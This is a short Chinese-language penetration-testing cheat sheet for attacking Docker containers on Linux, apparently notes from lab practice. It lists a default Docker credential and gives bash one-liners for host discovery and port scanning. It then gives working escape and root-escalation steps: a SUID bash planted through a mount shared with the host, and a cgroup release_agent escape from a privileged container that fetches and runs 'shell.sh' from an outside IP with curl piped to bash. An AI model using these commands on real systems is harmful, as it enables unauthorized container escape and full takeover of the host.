# Linux
##### 判断 docker
```
ip a 显示 c 类
根目录存在 .dockerenv 
```

**Docker 默认凭据：**
docker ：tcuser
##### 枚举网络
枚举存活主机
```bash
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
枚举主机开放端口
```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```

##### 逃逸方法
###### - 如果 home 目录中有户文件夹，且 `/etc/passwd` 中没有该用户，且显示文件夹属主为 id 而不是用户名：
（猜测此主目录已从主机装载到容器中）
```
mount | grep <File Name(用户名)>
```

如果开放了22端口，大概率存在密码重用。


##### 提权方法
如果 docker 中的 user 是 root，并有文件是从主机中 mount 过来的，那就可以在**主机中**复制一份 /bin/bash 到 docker mount 的文件夹下，然后在 docker 中使用 root 用户赋予 bash rwsrwxrwx , 然后 ssh 登录主机，可以看到在 docker 中 root 用户修改权限，拥有 SUID 的 bash，直接 bash -p 提权至主机 root
```
cp /bin/bash .                         (在主机中 不是在docker中)
chown root:root ./bash                 (docker中root用户修改权限)
chmod 777 ./bash ; chmod u+s ./bash    (docker中root用户修改权限)
```


### docker -compose.yml 中 `privileged` 值为 true
意味着容器在主机上具有 root 权限
```bash
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.14.11/shell.sh | bash' >/c;
建立监听，服务器后执行
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
```

